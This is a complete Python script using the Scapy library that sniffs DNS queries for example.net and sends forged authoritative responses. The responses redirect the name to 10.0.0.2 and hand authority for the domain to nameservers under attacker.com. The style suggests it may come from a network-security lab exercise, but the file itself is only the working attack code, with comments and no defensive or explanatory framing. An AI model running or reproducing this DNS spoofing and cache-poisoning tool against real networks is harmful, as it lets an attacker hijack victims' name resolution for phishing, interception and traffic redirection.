#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):

	if (DNS in pkt and b'example.net' in pkt[DNS].qd.qname):
		# Swap the source and destination IP address
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

		# Swap the source and destination port number
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

		# The Answer Section
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=303030, rdata='10.0.0.2')

		NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=90000, rdata='ns1.attacker.com')
		NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=90000, rdata='ns2.attacker.com')
		Addsec1 = DNSRR(rrname='ns1.attacker.com', type='A', ttl=90000, rdata='10.10.10.1')
		Addsec2 = DNSRR(rrname='ns2.attacker.com', type='A', ttl=90000, rdata='10.10.10.2')

		# Construct the DNS packet
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns = NSsec1/NSsec2, ar = Addsec1/Addsec2)

		# Construct the entire IP packet
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
